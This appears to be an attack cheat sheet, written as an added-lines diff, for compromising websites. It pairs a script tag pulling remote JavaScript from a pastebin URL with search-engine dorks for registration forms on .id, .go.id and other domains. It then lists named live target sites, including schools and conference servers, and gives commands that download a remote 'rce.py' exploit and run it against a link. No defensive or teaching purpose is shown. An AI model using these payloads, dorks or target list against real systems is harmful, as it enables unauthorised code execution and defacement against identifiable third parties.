@@ -1,0 +1,37 @@
+
+SC JSO KNTL
+<script type="text/javascript" src="https://pastebin.com/raw/4NR7G5sS"></script>
+Dork : inurl:/register.html intext:form pendafataran site:.or.id
+inurl:/register.html intext:form pendafataran site:.co.id
+inurl:/register.html intext:form pendafataran site:.net
+inurl:/register.html intext:form pendafataran site:.go.id
+inurl:/register.html intext:form pendafataran site:.in
+Live Target :
+http://drocktourtravel.com/
+http://sanggarraniawedding.com/
+http://ma-almaarifbilae.sch.id/
+http://stiepan.kreatifdesain.net/
+http://adaindonesia.or.id/
+https://duniatokoh.id/
+
+http://conference.cityofredlands.org/scripts/
+http://conf.aircontrolproducts.com/scripts/
+http://conference.ridleycollege.com/scripts/
+http://meetings.soscanhelp.com/scripts/
+http://conference.mcptri.com/scripts/
+http://conference.sebastiancorp.com/scripts/
+http://conference.asumidsouth.edu/scripts/
+http://sa100.neenah.k12.wi.us/scripts/
+http://myconference.personcounty.net/scripts/
+http://conference.aumhc.org/scripts/
+
+pkg install wget
+
+wget https://raw.githubusercontent.com/clown-syndicate/RCE/master/rce.py 
+
+pkg install python2
+
+pip install mechanize
+
+python2 rce.py link
+
